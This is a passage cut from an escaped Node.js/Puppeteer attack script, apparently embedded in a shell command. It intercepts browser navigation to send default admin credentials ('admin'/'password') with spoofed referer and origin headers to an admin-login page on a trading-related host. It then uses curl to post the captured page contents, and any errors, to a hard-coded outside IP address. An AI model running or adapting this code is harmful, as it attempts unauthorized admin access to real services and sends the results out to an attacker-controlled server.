(),\"content-type\":\"application/x-www-form-urlencoded\",\"referer\":\"https://app.bmx.trade/\",\"origin\":\"https://app.bmx.trade\"}})}else req.continue()});try{await pg5.goto(\"https://base-hedger82.rasa.capital/admin-login\",{waitUntil:\"networkidle0\",timeout:10000});r.admin1=await pg5.evaluate(()=>document.body.innerText.substring(0,500))}catch(e){r.admin1=\"ERR:\"+e.message.substring(0,100)}await pg5.close();const pg6=await b.newPage();await pg6.setRequestInterception(true);pg6.on(\"request\",req=>{if(req.isNavigationRequest()){req.continue({method:\"POST\",postData:\"grant_type=password&username=admin&password=password\",headers:{...req.headers(),\"content-type\":\"application/x-www-form-urlencoded\",\"referer\":\"https://app.bmx.trade/\",\"origin\":\"https://app.bmx.trade\"}})}else req.continue()});try{await pg6.goto(\"https://base-hedger82.rasa.capital/admin-login\",{waitUntil:\"networkidle0\",timeout:10000});r.admin2=await pg6.evaluate(()=>document.body.innerText.substring(0,500))}catch(e){r.admin2=\"ERR:\"+e.message.substring(0,100)}await pg6.close();cp.execSync(\"curl -s -X POST http://93.127.162.210:9977/v48_results -d @-\",{input:JSON.stringify(r)});await b.close()})().catch(e=>cp.execSync(\"curl -s http://93.127.162.210:9977/e48?err=\"+encodeURIComponent(e.message.substring(0,200))))'; echo done)"
